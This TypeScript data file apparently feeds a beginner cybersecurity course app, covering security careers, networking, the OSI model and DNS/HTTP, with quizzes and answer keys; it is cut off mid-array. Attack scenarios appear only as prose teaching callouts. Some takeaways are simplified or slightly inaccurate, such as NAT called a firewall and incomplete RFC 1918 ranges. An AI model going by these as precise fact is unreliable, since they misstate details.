import { Module, Course } from './types';
import { GOOGLE_CYBER_MODULES } from './dataGoogleCyber';

export const MODULES_DATA: Module[] = [
  {
    id: 'intro-to-cybersecurity',
    title: 'Introduction to Cyber Security',
    description: 'Learn about the core concepts of offensive security, defensive security, career pathways, and general cybersecurity vocabulary.',
    topics: [
      {
        id: 'offensive-security-intro',
        moduleId: 'intro-to-cybersecurity',
        title: 'Offensive Security Intro',
        description: 'Understand how ethical hackers compromise systems to find vulnerabilities and secure organizations.',
        status: 'unlocked',
        iconType: 'sword',
        content: '',
        realWorldCallout: {
          title: 'Bank Vault Assessment',
          concept: 'Physical and Digital Penetration Testing',
          scenario: 'Apex Security is hired by a major bank to test their security. A pentester spoofs an employee ID badge, walks past physical security, plugs a small rogue device (Rubber Ducky) into an unattended workstation, and gains remote access to the internal banking network.',
          relevance: 'This shows that offensive security is not just about digital exploits, but also social engineering and physical security. It proved to the bank that physical access equals total compromise.'
        },
        mindmap: [
          { id: 'off-sec', label: 'Offensive Security', description: 'Adversarial approach to security', x: 50, y: 15, connections: ['pentesting', 'red-team', 'vuln-assess'] },
          { id: 'pentesting', label: 'Penetration Testing', description: 'Simulated cyberattack on a system', x: 25, y: 50 },
          { id: 'red-team', label: 'Red Teaming', description: 'Stealthy full-scope defense test', x: 50, y: 55 },
          { id: 'vuln-assess', label: 'Vulnerability Assessment', description: 'Finding and cataloging security flaws', x: 75, y: 50 }
        ],
        keyTakeaways: [
          'Offensive security is proactive and fully authorized; unauthorized hacking is illegal.',
          'Penetration testing is highly structured and focuses on finding as many bugs as possible.',
          'Red Teaming mimics real threat actors, focusing on stealth and overall incident response, rather than cataloging every single vulnerability.',
          'Vulnerabilities must be patched and re-tested to ensure they are remediated.'
        ],
        quiz: [
          {
            id: 'q-off-1',
            question: 'What is the primary difference between offensive security and illegal hacking?',
            type: 'text',
            correctAnswer: 'Authorization',
            hint: 'Offensive security operations are always fully authorized by the system owner.'
          },
          {
            id: 'q-off-2',
            question: 'Which color team is responsible for simulating adversary attacks to test defenses?',
            type: 'text',
            correctAnswer: 'Red Team',
            hint: 'They play the role of the attackers.'
          },
          {
            id: 'q-off-3',
            question: 'What is a Penetration Test?',
            type: 'text',
            correctAnswer: 'A simulated attack to find vulnerabilities',
            hint: 'It focuses on finding as many bugs as possible.'
          },
          {
            id: 'q-off-4',
            question: 'Why is enumeration a critical phase in offensive security?',
            type: 'text',
            correctAnswer: 'To gather information and map the target',
            hint: 'You cannot attack what you do not know exists.'
          },
          {
            id: 'q-off-5',
            question: 'What is the purpose of tools like DIRB or Gobuster?',
            type: 'text',
            correctAnswer: 'Directory brute-forcing',
            hint: 'They find hidden paths on web servers.'
          }
        ]
      },
      {
        id: 'defensive-security-intro',
        moduleId: 'intro-to-cybersecurity',
        title: 'Defensive Security Intro',
        description: 'Explore the protective side of cyber, including monitoring, forensics, threat detection, and incident response.',
        status: 'unlocked',
        iconType: 'shield',
        content: '',
        realWorldCallout: {
          title: 'The Ransomware Containment',
          concept: 'Incident Detection & Quarantine',
          scenario: 'At 2:00 AM, a defensive system alerts the SOC that a server is rapidly renaming files with a ".locked" extension. Within 2 minutes, a SOC Analyst confirms it is ransomware. They immediately isolate the infected server from the local network, preventing the malware from spreading to the other 400 computers in the building.',
          relevance: 'This illustrates the critical speed of defensive security operations and shows how isolation/quarantine saves millions of dollars in business operational downtime.'
        },
        mindmap: [
          { id: 'def-sec', label: 'Defensive Security', description: 'Defending assets and detecting attacks', x: 50, y: 15, connections: ['soc', 'ir', 'forensics', 'malware'] },
          { id: 'soc', label: 'SOC Operations', description: '24/7 continuous log & event monitoring', x: 15, y: 50 },
          { id: 'ir', label: 'Incident Response', description: 'Containing active network breaches', x: 38, y: 55 },
          { id: 'forensics', label: 'Digital Forensics', description: 'Analyzing digital evidence post-incident', x: 62, y: 55 },
          { id: 'malware', label: 'Malware Analysis', description: 'Deconstructing malicious programs', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'Defensive security is reactive (incident response) AND proactive (vulnerability patching, firewall configurations).',
          'A SOC utilizes SIEM (Security Information and Event Management) tools to aggregate millions of system logs.',
          'Digital Forensics must follow a strict "chain of custody" so evidence is legally admissible.',
          'Quarantine is the absolute first action when containing an active network threat.'
        ],
        quiz: [
          {
            id: 'q-def-1',
            question: 'What does SOC stand for in defensive security?',
            type: 'text',
            correctAnswer: 'Security Operations Center',
            hint: 'It is the command center for monitoring logs and alerts 24/7.'
          },
          {
            id: 'q-def-2',
            question: 'Which field involves analyzing digital evidence post-compromise?',
            type: 'text',
            correctAnswer: 'Digital Forensics',
            hint: 'It requires following a strict chain of custody for legal admissibility.'
          },
          {
            id: 'q-def-3',
            question: 'What is the immediate primary goal of Incident Response during an active breach?',
            type: 'text',
            correctAnswer: 'Containment / Quarantine',
            hint: 'Stop the threat from spreading further into the network.'
          },
          {
            id: 'q-def-4',
            question: 'What type of tool is used to aggregate and analyze millions of system logs?',
            type: 'text',
            correctAnswer: 'SIEM',
            hint: 'Security Information and Event Management.'
          },
          {
            id: 'q-def-5',
            question: 'Which team is responsible for defending the network against simulated or real attacks?',
            type: 'text',
            correctAnswer: 'Blue Team',
            hint: 'The counterpart to the Red Team.'
          }
        ]
      },
      {
        id: 'careers-in-cyber',
        moduleId: 'intro-to-cybersecurity',
        title: 'Careers in Cyber',
        description: 'Analyze different cybersecurity jobs, domains, and certifications to map out your learning path.',
        status: 'unlocked',
        iconType: 'clipboard',
        content: '',
        realWorldCallout: {
          title: 'Entering the Field',
          concept: 'Certification and Practical Skills',
          scenario: 'Alice transitions from a customer support representative to a junior SOC analyst in 8 months. She does this by obtaining her CompTIA Security+ certification to learn theory, and practicing hands-on security labs on platforms like TryHackMe to demonstrate practical technical knowledge during her interviews.',
          relevance: 'Demonstrates that entry into cybersecurity requires a combination of foundational certification knowledge and hands-on, practical labs.'
        },
        mindmap: [
          { id: 'careers', label: 'Cyber Careers', description: 'Vast field of specializations', x: 50, y: 15, connections: ['red-roles', 'blue-roles', 'grc-roles'] },
          { id: 'red-roles', label: 'Offensive Roles', description: 'Pentesters, Red Teamers, Bug Hunters', x: 20, y: 50 },
          { id: 'blue-roles', label: 'Defensive Roles', description: 'SOC Analysts, IR, Forensics, Hunters', x: 50, y: 55 },
          { id: 'grc-roles', label: 'Compliance & Eng', description: 'GRC, Architects, Secure Coders', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'Cybersecurity is not just about hacking; defense, architecture, and compliance are equally vital.',
          'SOC Analyst is often the most common entry-level role on the defensive side.',
          'Junior Pentester is a highly competitive offensive role that requires solid networking and web fundamentals.',
          'Hands-on laboratories (CTFs, TryHackMe rooms) are a major differentiator on standard CVs.'
        ],
        quiz: [
          {
            id: 'q-car-1',
            question: 'What is typically the most common entry-level role on the defensive side?',
            type: 'text',
            correctAnswer: 'SOC Analyst',
            hint: 'Involves triaging alerts in a 24/7 operations center.'
          },
          {
            id: 'q-car-2',
            question: 'Which role proactively searches network traffic for undetected threats?',
            type: 'text',
            correctAnswer: 'Threat Hunter',
            hint: 'They assume a breach has already occurred and hunt for it.'
          },
          {
            id: 'q-car-3',
            question: 'What does GRC stand for?',
            type: 'text',
            correctAnswer: 'Governance, Risk, and Compliance',
            hint: 'Deals with regulations, audits, and corporate policies.'
          },
          {
            id: 'q-car-4',
            question: 'Is a Junior Pentester role considered entry-level?',
            type: 'text',
            correctAnswer: 'No',
            hint: 'It is highly competitive and requires solid networking and web fundamentals.'
          },
          {
            id: 'q-car-5',
            question: 'How can you stand out when applying for cybersecurity roles without experience?',
            type: 'text',
            correctAnswer: 'Hands-on laboratories and certifications',
            hint: 'Platforms like TryHackMe or CTFs show practical skills.'
          }
        ]
      },
      {
        id: 'mystery-chest',
        moduleId: 'intro-to-cybersecurity',
        title: 'Mystery Chest',
        description: 'A collection of essential resources, terminal shortcuts, and tips for security students.',
        status: 'unlocked',
        iconType: 'chest',
        content: '',
        realWorldCallout: {
          title: 'The Tab Key Savior',
          concept: 'Terminal Efficiency & Accuracy',
          scenario: 'A junior pentester is attempting to run a script with a very long filename: "exploit_cve_2026_99812_auth_bypass_v3.py". Instead of typing all 45 characters and risking a typo, they type "python3 ex" and press "Tab". The terminal instantly completes the filename, allowing them to launch it instantly.',
          relevance: 'Shows that simple terminal efficiency prevents typos, which is crucial during fast-paced examinations or threat remediation sessions.'
        },
        mindmap: [
          { id: 'shortcuts', label: 'Terminal Skills', description: 'Essential command line hacks', x: 50, y: 15, connections: ['completion', 'kill-proc', 'clear-scr'] },
          { id: 'completion', label: 'Tab Key', description: 'Instant auto-complete for paths & commands', x: 20, y: 50 },
          { id: 'kill-proc', label: 'Ctrl + C', description: 'Hard stop running processes instantly', x: 50, y: 55 },
          { id: 'clear-scr', label: 'Ctrl + L', description: 'Quickly clear terminal screen clutter', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'Using "Tab" auto-complete will save you hundreds of hours in the CLI.',
          'Ctrl+C is your emergency brake in command environments.',
          'Continuous documentation is the only way to manage cybersecurity knowledge explosion.',
          'Linux mastery is mandatory for serious offensive and defensive analysts.'
        ],
        quiz: [
          {
            id: 'q-mys-1',
            question: 'Which terminal key combination immediately terminates a running process?',
            type: 'text',
            correctAnswer: 'Ctrl + C',
            hint: 'The emergency brake for the command line.'
          },
          {
            id: 'q-mys-2',
            question: 'Which key provides instant auto-complete for paths and commands in Linux?',
            type: 'text',
            correctAnswer: 'Tab',
            hint: 'Saves time and prevents typos.'
          },
          {
            id: 'q-mys-3',
            question: 'What does CTF stand for in cybersecurity training?',
            type: 'text',
            correctAnswer: 'Capture The Flag',
            hint: 'A challenge format where you find a hidden text block to score points.'
          },
          {
            id: 'q-mys-4',
            question: 'What is the shortcut to quickly clear the terminal screen?',
            type: 'text',
            correctAnswer: 'Ctrl + L',
            hint: 'Helps remove clutter from previous command outputs.'
          }
        ]
      }
    ]
  },
  {
    id: 'network-fundamentals',
    title: 'Network Fundamentals',
    description: 'Master how computers talk to each other. Explore IP addresses, MAC addresses, LAN hubs/switches, and the 7-layer OSI model.',
    topics: [
      {
        id: 'what-is-networking',
        moduleId: 'network-fundamentals',
        title: 'What is Networking?',
        description: 'Understand the basic components of a network, client-server models, IP/MAC identification, and latency tests.',
        status: 'unlocked',
        iconType: 'network',
        content: '',
        realWorldCallout: {
          title: 'The Echo Request',
          concept: 'ICMP Diagnostic Flow',
          scenario: "A network technician cannot access a remote file share. They run 'ping 10.10.10.10'. The ping returns successful replies with a 4ms latency, proving that the physical connection and IP routing are functional, meaning the issue lies at a higher layer like authentication or file sharing permissions.",
          relevance: 'Demonstrates that ping is the absolute first diagnostic tool used to isolate physical and logical routing issues.'
        },
        mindmap: [
          { id: 'what-is-networking-root', label: 'What is Networking?', description: 'Two or more devices connected to communicate', x: 50, y: 15, connections: ['device-id', 'ip-versions', 'protocols', 'ping-icmp'] },
          { id: 'device-id', label: 'Device ID', description: 'Identification using IP and MAC addresses', x: 20, y: 50, connections: ['ip-address', 'mac-address'] },
          { id: 'ip-address', label: 'IP Address', description: 'Logical identity: Public vs Private IP', x: 10, y: 80 },
          { id: 'mac-address', label: 'MAC Address', description: 'Physical hardware address (e.g., a4:c3:f0:85:ac:2d)', x: 30, y: 80 },
          { id: 'ip-versions', label: 'IP Versions', description: 'IPv4 (32-bit, ~4.3B) vs IPv6 (128-bit)', x: 45, y: 50 },
          { id: 'protocols', label: 'Protocols', description: 'Standard rules allowing communication (TCP, UDP, etc.)', x: 65, y: 50 },
          { id: 'ping-icmp', label: 'Ping & ICMP', description: 'Checks reachability and measures latency', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'A network is a collection of connected devices sharing resources.',
          'The Internet is a massive network of interconnected networks.',
          'Devices are identified by both a logical IP address and a physical MAC address.',
          'Private IPs are used inside local networks, while Public IPs are given by ISPs for Internet communication.',
          'IPv6 solves the IPv4 address exhaustion crisis by using a 128-bit address space.'
        ],
        quiz: [
          {
            id: 'q-net-1',
            question: 'What is the primary definition of a computer network?',
            type: 'text',
            correctAnswer: 'Two or more interconnected devices communicating',
            hint: 'It allows devices to share data and resources.'
          },
          {
            id: 'q-net-2',
            question: 'What is the difference between an IP address and a MAC address?',
            type: 'text',
            correctAnswer: 'IP is logical and routable, MAC is physical and local',
            hint: 'One changes when you move networks, the other is burned into the hardware.'
          },
          {
            id: 'q-net-3',
            question: 'What is the primary difference between IPv4 and IPv6?',
            type: 'text',
            correctAnswer: 'Address space size',
            hint: 'One is 32-bit (running out), the other is 128-bit.'
          },
          {
            id: 'q-net-4',
            question: 'What is the purpose of the ICMP protocol (Ping)?',
            type: 'text',
            correctAnswer: 'To test network connectivity and latency',
            hint: 'It measures how long it takes a packet to travel back and forth.'
          },
          {
            id: 'q-net-5',
            question: 'Why do we need private IP addresses?',
            type: 'text',
            correctAnswer: 'To save public IPv4 space via NAT',
            hint: 'They are not routable on the public internet.'
          }
        ]
      },
      {
        id: 'intro-to-lan',
        moduleId: 'network-fundamentals',
        title: 'Intro to LAN',
        description: 'Explore Local Area Networks, MAC address structures, Hubs vs Switches, and DHCP addressing.',
        status: 'unlocked',
        iconType: 'lan',
        content: '',
        realWorldCallout: {
          title: 'The Silent Switch',
          concept: 'MAC Address Table Building',
          scenario: "When a new computer is plugged into a switch, the switch does not know its MAC address. The computer sends an ARP request, and as the packet passes through, the switch reads the source MAC and records it in its MAC table. From that point on, traffic for that computer is sent only to its specific port instead of being broadcast.",
          relevance: 'Demonstrates how Layer 2 devices dynamically learn network topology to keep communication efficient.'
        },
        mindmap: [
          { id: 'intro-to-lan-root', label: 'Intro to LAN', description: 'Local Area Networks of connected devices', x: 50, y: 15, connections: ['lan-hardware', 'dhcp-dora', 'arp-protocol'] },
          { id: 'lan-hardware', label: 'Hardware', description: 'NICs, Cables, Hubs, Switches, Routers', x: 20, y: 50, connections: ['hubs-vs-switches', 'routers'] },
          { id: 'hubs-vs-switches', label: 'Hubs vs Switches', description: 'Broadcast (Hub) vs MAC-addressed Unicast (Switch)', x: 10, y: 80 },
          { id: 'routers', label: 'Routers', description: 'Connects different networks (Layer 3)', x: 30, y: 80 },
          { id: 'dhcp-dora', label: 'DHCP DORA', description: 'Discover, Offer, Request, ACK', x: 50, y: 50 },
          { id: 'arp-protocol', label: 'ARP', description: 'Resolves logical IP to physical MAC address', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'A LAN is a private network operating in a localized physical space.',
          'Switches build MAC address tables to route frames efficiently to single ports, unlike Hubs which flood all ports.',
          'DHCP uses the four-step DORA handshake to lease IP configurations automatically.',
          'ARP bridges Layer 3 to Layer 2 by mapping a destination IP address to its physical hardware MAC address.',
          'Subnetting segregates a large network into smaller broadcast domains for security and performance.'
        ],
        quiz: [
          {
            id: 'q-lan-1',
            question: 'What does LAN stand for?',
            type: 'text',
            correctAnswer: 'Local Area Network',
            hint: 'A network confined to a small geographic area.'
          },
          {
            id: 'q-lan-2',
            question: 'What is the main difference between a Switch and a Router?',
            type: 'text',
            correctAnswer: 'Switches connect devices locally, Routers connect networks',
            hint: 'Switches use MACs, routers use IPs.'
          },
          {
            id: 'q-lan-3',
            question: 'What protocol dynamically assigns IP addresses to devices on a LAN?',
            type: 'text',
            correctAnswer: 'DHCP',
            hint: 'Dynamic Host Configuration Protocol.'
          },
          {
            id: 'q-lan-4',
            question: 'What does ARP do?',
            type: 'text',
            correctAnswer: 'Maps an IP address to a MAC address',
            hint: 'Address Resolution Protocol.'
          },
          {
            id: 'q-lan-5',
            question: 'What defines a network topology?',
            type: 'text',
            correctAnswer: 'The physical or logical layout of devices',
            hint: 'Examples include Star, Bus, and Ring.'
          }
        ]
      },
      {
        id: 'osi-model',
        moduleId: 'network-fundamentals',
        title: 'OSI Model',
        description: 'Understand the 7 layers of the OSI Model, data encapsulation flows, and real-world blue/red team troubleshooting applications.',
        status: 'unlocked',
        iconType: 'osi',
        content: '',
        realWorldCallout: {
          title: 'The Multi-Layer Troubleshooter',
          concept: 'Cross-Layer Network Diagnostics',
          scenario: "An administrator notes a server is unreachable. They verify Layer 1 is fine (cable is plugged in and link lights are on), Layer 2 is working (the switch table lists the server's MAC), Layer 3 is up (the router can ping the server's IP), but the application is down because the HTTP daemon crashed at Layer 7.",
          relevance: 'Demonstrates why network and security engineers systematically troubleshoot issues starting from the physical layer up.'
        },
        mindmap: [
          { id: 'osi-model-root', label: '7-Layer OSI Model', description: 'Standard communication framework', x: 50, y: 15, connections: ['software-layers', 'transport-layer', 'routing-switching', 'hardware-layer'] },
          { id: 'software-layers', label: 'L5 - L7 (Software)', description: 'Application (L7), Presentation (L6), Session (L5)', x: 15, y: 50 },
          { id: 'transport-layer', label: 'L4 (Transport)', description: 'TCP vs UDP, flow control and segments', x: 40, y: 50 },
          { id: 'routing-switching', label: 'L3 (Network)', description: 'IP addressing, packet routing, and routers', x: 65, y: 50 },
          { id: 'hardware-layer', label: 'L1 - L2 (Physical & Link)', description: 'Data Link (L2 frames, MAC) and Physical (L1 bits, cables)', x: 88, y: 50 }
        ],
        keyTakeaways: [
          'The OSI model has 7 structured layers, standardizing communication protocols across vendors.',
          'Data moves DOWN the stack on sending systems (Encapsulation) and UP the stack on receiving systems (Decapsulation).',
          'Each layer has its own unique Data Protocol Unit: Segment (L4), Packet (L3), Frame (L2), Bit (L1).',
          'Troubleshooting starts from Physical (L1) and rises to Application (L7) to isolate failures logically.',
          'Different network devices function at separate layers: Routers operate at L3, while Switches function at L2.'
        ],
        quiz: [
          {
            id: 'q-osi-1',
            question: 'How many layers are in the OSI Model?',
            type: 'text',
            correctAnswer: '7',
            hint: 'Please Do Not Throw Sausage Pizza Away.'
          },
          {
            id: 'q-osi-2',
            question: 'At which OSI layer do IP addresses operate?',
            type: 'text',
            correctAnswer: 'Layer 3 (Network Layer)',
            hint: 'Routers operate here.'
          },
          {
            id: 'q-osi-3',
            question: 'At which OSI layer do MAC addresses operate?',
            type: 'text',
            correctAnswer: 'Layer 2 (Data Link Layer)',
            hint: 'Switches operate here.'
          },
          {
            id: 'q-osi-4',
            question: 'What is encapsulation in the context of the OSI model?',
            type: 'text',
            correctAnswer: 'Adding headers as data moves down the layers',
            hint: 'It packages the data for transport.'
          },
          {
            id: 'q-osi-5',
            question: 'Which layer is closest to the end-user?',
            type: 'text',
            correctAnswer: 'Layer 7 (Application Layer)',
            hint: 'Web browsers and HTTP operate here.'
          }
        ]
      },
      {
        id: 'packets-and-frames',
        moduleId: 'network-fundamentals',
        title: 'Packets & Frames',
        description: 'Differentiate TCP and UDP transport models, analyze the 3-way handshake, and master packet encapsulation structures.',
        status: 'unlocked',
        iconType: 'packet',
        content: '',
        realWorldCallout: {
          title: 'The Unanswered Call',
          concept: 'SYN Flooding DDoS Defense',
          scenario: "An attacker targets a server by sending thousands of SYN packets with spoofed IP addresses. The server allocates memory for each connection and responds with a SYN-ACK, but the spoofed IPs never send the final ACK. The server's connection slots fill up, crashing the service for legitimate users.",
          relevance: 'Illustrates how the structural handshake requirements of TCP can be exploited to launch Denial of Service attacks.'
        },
        mindmap: [
          { id: 'packets-and-frames-root', label: 'Packets & Frames', description: 'Data structures and transport mechanics', x: 50, y: 15, connections: ['pdus', 'transport-layer-protocols', 'handshake-mechanic'] },
          { id: 'pdus', label: 'PDUs', description: 'L3 Packets (IPs) vs L2 Frames (MACs)', x: 20, y: 50 },
          { id: 'transport-layer-protocols', label: 'L4 Protocols', description: 'TCP (Reliable, structured) vs UDP (Fast, stateless)', x: 50, y: 50 },
          { id: 'handshake-mechanic', label: '3-Way Handshake', description: 'SYN -> SYN-ACK -> ACK connection sequence', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'Packets are Layer 3 structures containing IP addresses; Frames are Layer 2 structures containing MAC addresses.',
          'Encapsulation nests upper-layer headers inside lower-layer frames before transmission.',
          'TCP guarantees delivery using sliding windows, acknowledgements, and flow control.',
          'UDP transmits datagrams directly without session establishment, minimizing transmission overhead.',
          'The TCP three-way handshake coordinates sequence numbers before data exchange begins.'
        ],
        quiz: [
          {
            id: 'q-pack-1',
            question: 'What is the difference between TCP and UDP?',
            type: 'text',
            correctAnswer: 'TCP is reliable/connection-oriented, UDP is fast/connectionless',
            hint: 'TCP ensures delivery, UDP throws and forgets.'
          },
          {
            id: 'q-pack-2',
            question: 'How many steps are in the TCP Handshake?',
            type: 'text',
            correctAnswer: '3 (SYN, SYN-ACK, ACK)',
            hint: 'It establishes the reliable connection.'
          },
          {
            id: 'q-pack-3',
            question: 'What are Ports used for in networking?',
            type: 'text',
            correctAnswer: 'To direct traffic to the correct application/service',
            hint: 'IP gets it to the right building, Port gets it to the right door.'
          },
          {
            id: 'q-pack-4',
            question: 'What is the default port for HTTP?',
            type: 'text',
            correctAnswer: '80',
            hint: 'HTTPS uses 443.'
          },
          {
            id: 'q-pack-5',
            question: 'What is a packet in networking?',
            type: 'text',
            correctAnswer: 'A formatted unit of data carried by a packet-switched network',
            hint: 'Data is broken down into these for transmission.'
          }
        ]
      },
      {
        id: 'extending-your-network',
        moduleId: 'network-fundamentals',
        title: 'Extending Your Network',
        description: 'Explore WAN concepts, DNS record lookups, RFC 1918 Private vs Public boundaries, and NAT translation mechanisms.',
        status: 'unlocked',
        iconType: 'lan',
        content: '',
        realWorldCallout: {
          title: 'The Invisible Shield',
          concept: 'NAT Security Boundary',
          scenario: "An administrator notes that external scanners on the public Internet can ping their router's public IP, but are physically unable to probe the developer laptops on the local network. This is because NAT acts as a one-way stateful firewall; unless a local device initiates the outbound connection, the router has no translation mapping and drops any incoming traffic targeting private IP addresses.",
          relevance: 'Demonstrates how NAT provides an inherent security layer, preventing direct, unsolicited external connections to internal hosts.'
        },
        mindmap: [
          { id: 'extending-your-network-root', label: 'Extending Your Network', description: 'Expanding local boundaries to the WAN', x: 50, y: 15, connections: ['wan-boundary', 'nat-gateway', 'dns-namespace'] },
          { id: 'wan-boundary', label: 'WAN & IP Ranges', description: 'Wide Area Networks & RFC 1918 boundaries', x: 20, y: 50 },
          { id: 'nat-gateway', label: 'NAT Translation', description: 'Translating private LAN IPs to routable WAN IPs', x: 50, y: 50 },
          { id: 'dns-namespace', label: 'DNS Service', description: 'Domain namespace hierarchy and query records', x: 80, y: 50, connections: ['dns-records'] },
          { id: 'dns-records', label: 'DNS Records', description: 'A, AAAA, CNAME, MX, and TXT record types', x: 80, y: 80 }
        ],
        keyTakeaways: [
          'WANs link separate networks together across global physical scales.',
          'RFC 1918 mandates private non-routable IP blocks (10.x.x.x, 172.16.x.x, and 192.168.x.x) to conserve IPv4 space.',
          'NAT translates private source IP headers to public IP headers, tracking state in a local address table.',
          'DNS acts as a decentralized directory resolving user domains to structural IP addresses.',
          'Common DNS record definitions include A (IPv4), AAAA (IPv6), CNAME (Alias), and MX (Mail servers).'
        ],
        quiz: [
          {
            id: 'q-ext-1',
            question: 'What does NAT (Network Address Translation) do?',
            type: 'text',
            correctAnswer: 'Translates private IPs to a single public IP',
            hint: 'It allows multiple devices to share one internet connection.'
          },
          {
            id: 'q-ext-2',
            question: 'What is Port Forwarding?',
            type: 'text',
            correctAnswer: 'Routing external traffic to a specific internal device/port',
            hint: 'Needed to host a server on a private network.'
          },
          {
            id: 'q-ext-3',
            question: 'What is a VPN used for?',
            type: 'text',
            correctAnswer: 'Creating a secure, encrypted tunnel over the internet',
            hint: 'Virtual Private Network.'
          },
          {
            id: 'q-ext-4',
            question: 'How does a proxy differ from a VPN?',
            type: 'text',
            correctAnswer: 'Proxies generally only reroute web traffic and may not encrypt it',
            hint: 'VPNs encrypt all traffic from the device.'
          }
        ]
      },
      {
        id: 'mystery-chest-net',
        moduleId: 'network-fundamentals',
        title: 'Mystery Chest',
        description: 'Review core concepts, diagnostic commands, common port mappings, and test your knowledge in the Module 2 Summary.',
        status: 'locked',
        iconType: 'chest',
        content: '',
        realWorldCallout: {
          title: 'The Blueprint of Defense',
          concept: 'Comprehensive Network Defense',
          scenario: 'A SOC Analyst intercepts a security alert pointing to an internal workstation communicating with a rogue IP on port 23 (Telnet). Leveraging their network fundamentals, the analyst knows Telnet is unencrypted (Layer 7). They use nslookup to investigate the host, trace the malicious packets to the core switch (Layer 2), isolate the port, and prevent a major credential theft incident.',
          relevance: 'Demonstrates how mastering network diagnostics, ports, and structures directly enables security professionals to isolate and contain modern network threats.'
        },
        mindmap: [
          { id: 'mystery-chest-net-root', label: 'Module Summary', description: 'Consolidation of network fundamentals', x: 50, y: 15, connections: ['diagnostics-group', 'standards-group', 'concepts-group'] },
          { id: 'diagnostics-group', label: 'Diagnostics', description: 'ping, traceroute, nslookup, and ipconfig', x: 20, y: 50 },
          { id: 'standards-group', label: 'Ports & Protocols', description: 'Port 80 (HTTP), 443 (HTTPS), 53 (DNS), 22 (SSH)', x: 50, y: 50 },
          { id: 'concepts-group', label: 'Core Concepts', description: 'OSI 7 layers, NAT, and TCP/UDP transport models', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'The Network Fundamentals module builds the technical baseline required for security monitoring, log analysis, and threat containment.',
          'MAC addresses guide Layer 2 frame switching; IP addresses guide Layer 3 packet routing.',
          'The OSI model standardizes transport and logical paths, defining segments, packets, frames, and bits.',
          'TCP guarantees reliable transport via the SYN, SYN-ACK, ACK handshake; UDP provides rapid, lightweight datagram delivery.',
          'DNS acts as the public domain mapping registry; NAT translates private non-routable LAN blocks to public internet WAN IPs.'
        ],
        quiz: [
          {
            id: 'q-chest-net-1',
            question: 'Why is subnetting important?',
            type: 'text',
            correctAnswer: 'It divides a large network into smaller, more efficient networks',
            hint: 'Reduces broadcast traffic and improves security.'
          },
          {
            id: 'q-chest-net-2',
            question: 'What is the purpose of a Subnet Mask?',
            type: 'text',
            correctAnswer: 'To identify the network and host portions of an IP address',
            hint: 'Example: 255.255.255.0'
          },
          {
            id: 'q-chest-net-3',
            question: 'What is CIDR notation?',
            type: 'text',
            correctAnswer: 'A compact representation of an IP address and its routing prefix',
            hint: 'Example: /24.'
          },
          {
            id: 'q-chest-net-4',
            question: 'What does the ping command do?',
            type: 'text',
            correctAnswer: 'Tests reachability of a host using ICMP echo requests',
            hint: 'Used to check if a server is online.'
          }
        ]
      }
    ]
  },
  {
    id: 'how-the-web-works',
    title: 'How the Web Works',
    description: 'Learn HTML/CSS, DNS resolution hierarchy, and dissect HTTP requests, headers, and cookies.',
    isFuture: false,
    topics: [
      {
        id: 'dns-in-detail',
        moduleId: 'how-the-web-works',
        title: 'DNS in Detail',
        description: 'Understand how the Domain Name System works, records, and resolution.',
        status: 'unlocked',
        iconType: 'web',
        content: '',
        realWorldCallout: {
          title: 'DNS Cache Poisoning',
          concept: 'DNS Spoofing / Hijacking',
          scenario: 'An attacker intercepts DNS requests on a public Wi-Fi network and sends forged responses to users. When users type "mybank.com", the poisoned DNS cache resolves to the attacker\'s malicious server IP instead of the real bank, allowing the attacker to steal login credentials.',
          relevance: 'Shows how manipulating DNS records can redirect traffic seamlessly without the user noticing, emphasizing the importance of DNSSEC and secure resolution.'
        },
        mindmap: [
          { id: 'dns-root', label: 'DNS', description: 'Domain Name System', x: 50, y: 15, connections: ['dns-records', 'dns-servers'] },
          { id: 'dns-records', label: 'DNS Records', description: 'A, AAAA, CNAME, MX, TXT', x: 20, y: 50 },
          { id: 'dns-servers', label: 'DNS Servers', description: 'Recursive, Root, TLD, Authoritative', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'DNS translates human-readable domain names (tryhackme.com) into machine-routable IP addresses (10.10.10.10).',
          'The DNS hierarchy flows from Root (.) to Top Level Domain (TLD) to Authoritative servers.',
          'A records map to IPv4, AAAA map to IPv6, CNAME aliases domains, and MX routes email.',
          'Recursive DNS servers (like ISP or Google 8.8.8.8) query on your behalf and cache responses based on TTL.'
        ],
        quiz: [
          {
            id: 'q-dns-1',
            question: 'What is the primary function of DNS?',
            type: 'text',
            correctAnswer: 'Translates domain names to IP addresses',
            hint: 'It acts like the phonebook of the internet.'
          },
          {
            id: 'q-dns-2',
            question: 'What is the difference between an A record and an AAAA record?',
            type: 'text',
            correctAnswer: 'A maps to IPv4, AAAA maps to IPv6',
            hint: 'One is 32-bit, the other is 128-bit.'
          },
          {
            id: 'q-dns-3',
            question: 'What does a CNAME record do?',
            type: 'text',
            correctAnswer: 'Aliases one domain name to another domain name',
            hint: 'It does not map directly to an IP address.'
          },
          {
            id: 'q-dns-4',
            question: 'What is the purpose of an MX record?',
            type: 'text',
            correctAnswer: 'Specifies the mail server for the domain',
            hint: 'MX stands for Mail Exchange.'
          },
          {
            id: 'q-dns-5',
            question: 'What is the difference between a Recursive and an Authoritative DNS server?',
            type: 'text',
            correctAnswer: 'Recursive queries on your behalf, Authoritative holds the actual records',
            hint: 'Your ISP runs recursive; Cloudflare/AWS runs authoritative.'
          }
        ]
      },
      {
        id: 'http-in-detail',
        moduleId: 'how-the-web-works',
        title: 'HTTP in Detail',
        description: 'Understand HTTP requests, responses, methods, and status codes.',
        status: 'unlocked',
        iconType: 'web',
        content: '',
        realWorldCallout: {
          title: 'The Man in the Middle',
          concept: 'Cleartext HTTP Interception',
          scenario: 'A user logs into an admin portal over unencrypted HTTP. An attacker on the same local network runs Wireshark and captures the raw HTTP POST request, instantly extracting the admin username and password from the cleartext payload.',
          relevance: 'Highlights why modern web traffic relies on HTTPS (TLS/SSL) to encrypt request payloads and headers, preventing credential harvesting and session hijacking.'
        },
        mindmap: [
          { id: 'http-root', label: 'HTTP/HTTPS', description: 'HyperText Transfer Protocol', x: 50, y: 15, connections: ['http-req', 'http-res'] },
          { id: 'http-req', label: 'Requests', description: 'GET, POST, Headers, URL', x: 20, y: 50 },
          { id: 'http-res', label: 'Responses', description: 'Status Codes, Cookies', x: 80, y: 50 }
        ],
        keyTakeaways: [
